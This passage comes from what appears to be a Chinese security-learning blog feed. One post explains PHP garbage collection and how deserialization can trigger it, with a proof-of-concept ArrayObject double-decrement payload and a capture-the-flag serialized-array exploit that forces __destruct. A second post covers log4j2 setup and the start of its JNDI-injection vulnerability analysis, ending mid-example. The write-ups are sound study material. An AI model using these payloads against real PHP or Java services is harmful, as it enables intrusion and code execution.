class="hljs-string">&quot;new string&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$a</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-keyword">unset</span>( <span class="hljs-variable">$b</span>);<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-variable">$b</span> = &amp;<span class="hljs-variable">$a</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;测试数组引用计数&#x27;</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>);<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;c&#x27;</span> );<br><span class="hljs-variable">$d</span> = <span class="hljs-variable">$c</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;c&#x27;</span> );<br><span class="hljs-variable">$c</span>[<span class="hljs-number">2</span>]=<span class="hljs-string">&#x27;c&#x27;</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;c&#x27;</span> );<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;测试int型计数&#x27;</span>;<br><span class="hljs-variable">$e</span> = <span class="hljs-number">1</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;e&#x27;</span> );<br></code></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">测试字符串引用计数<br>a:(refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;new string&#x27;</span> (length=<span class="hljs-number">10</span>)<br>a:(refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;new string&#x27;</span> (length=<span class="hljs-number">10</span>)<br>a:(refcount=<span class="hljs-number">2</span>, is_ref=<span class="hljs-number">1</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;new string&#x27;</span> (length=<span class="hljs-number">10</span>) <span class="hljs-comment">//取地址引用时会改变</span><br>测试数组引用计数<br>c:(refcount=<span class="hljs-number">2</span>, is_ref=<span class="hljs-number">0</span>)<br><span class="hljs-keyword">array</span> (size=<span class="hljs-number">2</span>)<br>  <span class="hljs-number">0</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;a&#x27;</span> (length=<span class="hljs-number">1</span>)<br>  <span class="hljs-number">1</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;b&#x27;</span> (length=<span class="hljs-number">1</span>)<br>c:(refcount=<span class="hljs-number">3</span>, is_ref=<span class="hljs-number">0</span>) <br><span class="hljs-keyword">array</span> (size=<span class="hljs-number">2</span>)<br>  <span class="hljs-number">0</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;a&#x27;</span> (length=<span class="hljs-number">1</span>)<br>  <span class="hljs-number">1</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;b&#x27;</span> (length=<span class="hljs-number">1</span>)<br>c:(refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-comment">//数组值改变后，之前引用全部废弃</span><br><span class="hljs-keyword">array</span> (size=<span class="hljs-number">3</span>)<br>  <span class="hljs-number">0</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;a&#x27;</span> (length=<span class="hljs-number">1</span>)<br>  <span class="hljs-number">1</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;b&#x27;</span> (length=<span class="hljs-number">1</span>)<br>  <span class="hljs-number">2</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;c&#x27;</span> (length=<span class="hljs-number">1</span>)<br>测试<span class="hljs-keyword">int</span>型计数e:(refcount=<span class="hljs-number">0</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">int</span> <span class="hljs-number">1</span>  <span class="hljs-comment">//int型不计引用次数</span><br></code></pre></td></tr></table></figure><h3 id="回收周期"><a href="#回收周期" class="headerlink" title="回收周期"></a>回收周期</h3><p>PHP垃圾回收机制默认打开，可以设置php.ini值的<code>zend.enable_gc</code>，或者调用gc_enable() 和 gc_disable()函数。</p><p>当垃圾回收机制打开时，算法判断在根缓存区满时，执行循环查找，根缓存区大小需要通过修改php源码文件Zend&#x2F;zend_gc.c中的常量GC_ROOT_BUFFER_MAX_ENTRIES，然后重新编译PHP，来修改这个值。</p><blockquote><p>调用gc_disable()函数释放内存之前，先调用gc_collect_cycles()函数，以免根缓存区空间不足</p></blockquote><h3 id="垃圾的产生"><a href="#垃圾的产生" class="headerlink" title="垃圾的产生"></a>垃圾的产生</h3><p>PHP中一些复杂数据类型头部有一个GC，用于支持垃圾回收。</p><p>zend_reference 这个类型，这个是 PHP7 新增的变量类型，当对变量使用 “&amp;” 操作时，<u>会创建新的中间结构体 zend_reference，这个结构体会真正的指向对应的 value 结构。</u></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 当进行如下赋值操作时</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;hello&#x27;</span>; <span class="hljs-comment">// $a -&gt; zend_string</span><br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$a</span>; <span class="hljs-comment">// $b,$a -&gt; zend_string</span><br><span class="hljs-variable">$c</span> = &amp;<span class="hljs-variable">$b</span>; <span class="hljs-comment">// $c,$b -&gt; zval(type = IS_REFERENCE, refcount = 2) -&gt; zend_string</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072213238.png" alt="image-20230405153644317"></p><blockquote><p><code>$b和$c</code>的zval都是通过中间结构体再指向最终的zend_string</p></blockquote><h3 id="回收的过程"><a href="#回收的过程" class="headerlink" title="回收的过程"></a>回收的过程</h3><p>如果当变量的 refcount 减小后大于 0，PHP 并不会立即对这个变量进行垃圾鉴定和回收，而是放入一个缓冲区中，等这个缓冲区满了以后 (10000 个值) 再统一进行处理，加入缓冲区的是变量 zend_value 里的 gc，目前垃圾只会出现在数组和对象两种类型中，数组的情况上面已经介绍了，对象的情况则是成员属性引用对象本身导致的，其它类型不会出现这种变量中的成员引用变量自身的情况，所以垃圾回收只会处理这两种类型的变量。</p><p>gc 的结构 zend_refcounted_h 具体如下:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_zend_refcounted_h</span> &#123;<br>    <span class="hljs-type">uint32_t</span>         refcount; <span class="hljs-comment">// 记录 zend_value 的引用数</span><br>    <span class="hljs-keyword">union</span> &#123;<br>        <span class="hljs-keyword">struct</span> &#123;<br>            zend_uchar    type,  <span class="hljs-comment">// zend_value的类型, 与zval.u1.type一致</span><br>            zend_uchar    flags, <br>            <span class="hljs-type">uint16_t</span>      gc_info <span class="hljs-comment">// GC信息，记录在 gc 池中的位置和颜色，垃圾回收的过程会用到</span><br>        &#125; v;<br>        <span class="hljs-type">uint32_t</span> type_info;<br>    &#125; u;<br>&#125; zend_refcounted_h;<br></code></pre></td></tr></table></figure><p>一个变量只能加入一次缓冲区，为了防止重复加入，变量加入后会把 zend_refcounted_h.gc_info 置为 GC_PURPLE，即标为紫色，后续不会重复插入。</p><h2 id="反序列化中的利用"><a href="#反序列化中的利用" class="headerlink" title="反序列化中的利用"></a>反序列化中的利用</h2><h3 id="destruct魔术方法"><a href="#destruct魔术方法" class="headerlink" title="__destruct魔术方法"></a>__destruct魔术方法</h3><p>当某个对象成为垃圾或者当对象被显式销毁时执行</p><ul><li>显示销毁：unset或赋值NULL</li><li>隐式销毁：代码执行完毕后将所有申请的内存释放掉</li></ul><blockquote><p>在常规思路中destruct是隐式销毁触发的,尝试显式销毁</p></blockquote><h3 id="旧版本GC"><a href="#旧版本GC" class="headerlink" title="旧版本GC"></a>旧版本GC</h3><p>简单的判断了一下变量的zval的refcount是否为0，是的话就释放否则不释放直至进程结束。</p><h3 id="新版本GC-zval结构体"><a href="#新版本GC-zval结构体" class="headerlink" title="新版本GC-zval结构体"></a>新版本GC-zval结构体</h3><p>主动销毁变量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;111&quot;</span>;<br><span class="hljs-variable">$temp_name</span> = &amp;<span class="hljs-variable">$name</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>(<span class="hljs-string">&#x27;name&#x27;</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$temp_name</span>);<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>(<span class="hljs-string">&#x27;name&#x27;</span>);<br><span class="hljs-comment">//name:</span><br><span class="hljs-comment">//(refcount=2, is_ref=1)string &#x27;111&#x27; (length=3)</span><br><span class="hljs-comment">//name:</span><br><span class="hljs-comment">//(refcount=1, is_ref=1)string &#x27;111&#x27; (length=3)</span><br></code></pre></td></tr></table></figure><p>refcount计数减1，说明unset并非一定会释放内存，当有两个变量指向的时候，并非会释放变量占用的内存，只是refcount减1.</p><h3 id="触发垃圾回收"><a href="#触发垃圾回收" class="headerlink" title="触发垃圾回收"></a>触发垃圾回收</h3><p>该算法的实现可以在<code>Zend/zend_gc.c</code>（ <a href="https://github.com/php/php-src/blob/PHP-5.6.0/Zend/zend_gc.c">https://github.com/php/php-src/blob/PHP-5.6.0/Zend/zend_gc.c</a> ）中找到。每当销毁zval时（如在该zval上调用unset时），垃圾回收算法会检查其是否为数组或对象，除了这俩个类型外其他都不能包含循环引用，这一检查过程使用<code>gc_zval_possible_root</code>函数来实现。任何这种潜在的zval都被称为根（Root），并会被添加到一个名为<code>gc_root_buffer</code>的列表中。<br>然后，将会重复上述步骤，直至满足下述条件之一：</p><ul><li><code>gc_collect_cycles()</code>被手动调用</li><li>垃圾存储空间将满。这也就意味着，在根缓冲区的位置已经存储了10000个zval，并且即将添加新的根。10000时预定义常量GC_ROOT_BUFFER_MAX_ENTRIES,当出现第10001个zval时，将再次调用gc_zval_possible_root进行检查，此时会调用<code>gc_collect_cycles</code>以处理并刷新当前缓冲区</li></ul><blockquote><p>可以得到触发思路，填满垃圾存储空间</p></blockquote><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>反序列化过程允许一遍又一遍地传递相同的索引，所以不断会填充内存空间。一旦重新使用数组索引，旧元素的引用计数器就会递减。在反序列化过程中将会调用<code>zend_hash_update</code>，它将调用旧元素的析构函数（Destructor）。每当zval被销毁时，都会涉及到垃圾回收。这也就意味着，所有创建的数组都会开始填充垃圾缓冲区，直至超出其空间导致对<code>gc_collect_cycles</code>的调用。</p><h3 id="ArrayObject"><a href="#ArrayObject" class="headerlink" title="ArrayObject"></a>ArrayObject</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// POC of the ArrayObject GC vulnerability</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$serialized_string</span> = <span class="hljs-string">&#x27;a:1:&#123;i:1;C:11:&quot;ArrayObject&quot;:37:&#123;x:i:0;a:2:&#123;i:1;R:4;i:2;r:1;&#125;;m:a:0:&#123;&#125;&#125;&#125;&#x27;</span>;<br><span class="hljs-variable">$outer_array</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialized_string</span>);<br><span class="hljs-title function_ invoke__">gc_collect_cycles</span>();<br><span class="hljs-variable">$filler1</span> = <span class="hljs-string">&quot;aaaa&quot;</span>;<br><span class="hljs-variable">$filler2</span> = <span class="hljs-string">&quot;bbbb&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$outer_array</span>);<br></code></pre></td></tr></table></figure><p>实际上，一旦该示例执行，外部数组（由<code>$outer_array</code>引用）将会被释放，并且zval将会被<code>$filter2</code>的zval覆盖，导致输出”bbbb”。</p><p>ArrayObject的反序列化函数接受对另一个数组的引用，以用于初始化的目的。这也就意味着，一旦我们对一个ArrayObject进行反序列化后，就可以引用任何之前已经被反序列化过的数组。此外，这还将允许我们将整个哈希表中的所有条目递减两次。</p><p>1、得到一个应被释放的目标zval X；<br>2、创建一个数组Y，其中包含几处对zval X的引用：<code>array(ref_to_X, ref_to_X, […], ref_to_X)</code>；<br>3、创建一个ArrayObject，它将使用数组Y的内容进行初始化，因此会返回一次由垃圾回收标记算法访问过的数组Y的所有子元素。<br>通过上述步骤，我们可以操纵标记算法，对数组Y中的所有引用实现两次访问。但是，在反序列化过程中创建引用将会导致引用计数器增加2，所以还要找到解决方案：<br>4、使用与步骤3相同的方法，额外再创建一个ArrayObject。<br>一旦标记算法访问第二个ArrayObject，它将开始对数组Y中的所有引用进行第三次递减。我们现在就有方法能够使引用计数器递减，可以将该方法用于对任意目标zval的引用计数器实现清零。</p><p>举个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$flag</span> =<span class="hljs-string">&quot;flag&#123;&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(time).<span class="hljs-string">&quot;&#125;&quot;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;successful\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);<br><br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;中途退出啦&#x27;</span>);<br></code></pre></td></tr></table></figure><p>我们假如要执行__destruct方法，打印flag，就得绕过这个<code>throw new Exception</code>。因为<code>__destruct</code>方法是在该对象被回收时调用，而<code>exception</code>会中断该进程对该对象的销毁。所以我们需要强制让php的GC（垃圾回收机制）去进行该对象的回收。</p><p>核心思想：反序列化一个数组，然后再利用第一个索引，来触发GC</p><p>EXP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;AndyNoel&quot;</span>;<br>    &#125;<br>&#125; <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> B, <span class="hljs-keyword">new</span> B));<br><br><span class="hljs-comment">//a:2:&#123;i:0;O:1:&quot;B&quot;:0:&#123;&#125;i:1;O:1:&quot;B&quot;:0:&#123;&#125;&#125;</span><br></code></pre></td></tr></table></figure><blockquote><p>造成该漏洞的主要原因是ArrayObject缺少垃圾回收函数。该漏洞称为“双递减漏洞”</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php</tag>
      
      <tag>gc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>log4j2漏洞学习</title>
    <link href="/2022/09/30/log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/09/30/log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="log4j2漏洞学习"><a href="#log4j2漏洞学习" class="headerlink" title="log4j2漏洞学习"></a>log4j2漏洞学习</h1><h2 id="log4j与log4j2区别"><a href="#log4j与log4j2区别" class="headerlink" title="log4j与log4j2区别"></a>log4j与log4j2区别</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>log4j用.properties的文件作为主配置文件的，而现在的log4j 2则已经弃用了这种方式，采用的是.xml，.json或者.jsn这种方式来做</p><h3 id="核心jar包"><a href="#核心jar包" class="headerlink" title="核心jar包"></a>核心jar包</h3><p>log4j只需要引入一个jar包即可，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.17<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>而log4j 2则是需要2个核心</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>log4j和log4j 2的包路径是不同的,甚至可以在一个项目中使用2个版本的日志输出</p></blockquote><h3 id="文件渲染"><a href="#文件渲染" class="headerlink" title="文件渲染"></a>文件渲染</h3><p>log4j想要生效，我们需要在web.xml中进行配置</p><p>log4j2就比较简单，以maven工程为例，我们只需要把log4j2.xml放到工程resource目录下就行了。大家记住一个细节点，是log4j2.xml，而不是log4j.xml，<u>xml名字少个2都不行</u></p><h3 id="log调用"><a href="#log调用" class="headerlink" title="log调用"></a>log调用</h3><p>log4j</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.log4j.Logger;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">LOGGER</span> <span class="hljs-operator">=</span> Logger.getLogger(Test.class.getName());<br></code></pre></td></tr></table></figure><p>log4j2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.Level;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger(Test.class.getName());<br></code></pre></td></tr></table></figure><h2 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h2><p>如果log4j.properties一直不起作用，将其复制到target的classesxia</p><p><img src="/../../../../Pictures/%60log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%60/006y8mN6gy1h6qwvy8e0hj30r8056glt.jpg" alt="image-20221002140908570"></p><h3 id="一些配置教训"><a href="#一些配置教训" class="headerlink" title="一些配置教训"></a>一些配置教训</h3><p>注意版本对应</p><p>如果是2021.3的idea，不要使用高版本maven，应使用3.5.4</p><h3 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h3><p>第一次引入会因为没有下载而爆红，点击刷新即可</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232951.jpg" alt="image-20221002141921173"></p><h3 id="导包注意名称"><a href="#导包注意名称" class="headerlink" title="导包注意名称"></a>导包注意名称</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br></code></pre></td></tr></table></figure><blockquote><p>2.14.0 log4j导包</p></blockquote><h3 id="程序包-com-sun-jndi-rmi-registry-不可见"><a href="#程序包-com-sun-jndi-rmi-registry-不可见" class="headerlink" title="程序包 com.sun.jndi.rmi.registry 不可见"></a>程序包 com.sun.jndi.rmi.registry 不可见</h3><p>注意：还是得换成jdk1.8</p><p>解决，在pom.xml中加入以下标签</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>$&#123;java.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span>$&#123;java.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">encoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">encoding</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">compilerArguments</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">bootclasspath</span>&gt;</span>$&#123;java.home&#125;/lib/rt.jar<span class="hljs-tag">&lt;/<span class="hljs-name">bootclasspath</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">compilerArguments</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>注意：plugin标签要包裹在plugins中，plugins要包裹在build中</p></blockquote><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p>一般将日志对象定义为当前类等静态私有成员</p><h3 id="使用占位符-打印日志"><a href="#使用占位符-打印日志" class="headerlink" title="使用占位符{}打印日志"></a>使用占位符{}打印日志</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;bob&quot;</span>;<br><br>    logger.error(<span class="hljs-string">&quot;&#123;&#125; is not exited!&quot;</span>,user);<br>&#125;<br></code></pre></td></tr></table></figure><p>成功打印</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232469.jpg" alt="image-20221002151825195"></p><h3 id="lookups"><a href="#lookups" class="headerlink" title="lookups"></a>lookups</h3><p>可以通过<code>$&#123;xxx:xxx&#125;</code>等形式快速获取运行应用容器的docker属性，环境变量，日志事件，Java应用程序环境信息等内容。</p><h1 id="漏洞及分析"><a href="#漏洞及分析" class="headerlink" title="漏洞及分析"></a>漏洞及分析</h1><h3 id="影响版本范围"><a href="#影响版本范围" class="headerlink" title="影响版本范围"></a>影响版本范围</h3><p>2.0-beta9 &lt;&#x3D; Apache Log4j &lt;&#x3D; 2.15.0-rc1（1.x不受影响）</p><p>需要导入log4j-core才行</p><p>先用2.14.0做实验(JDK 1.8下)</p><blockquote><p>原理：JNDI注入</p></blockquote><h2 id="利用lookups获取敏感信息"><a href="#利用lookups获取敏感信息" class="headerlink" title="利用lookups获取敏感信息"></a>利用lookups获取敏感信息</h2><p>输出JDK版本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">LOGGER.error(<span class="hljs-string">&quot;Java version :&#123;&#125;&quot;</span>,<span 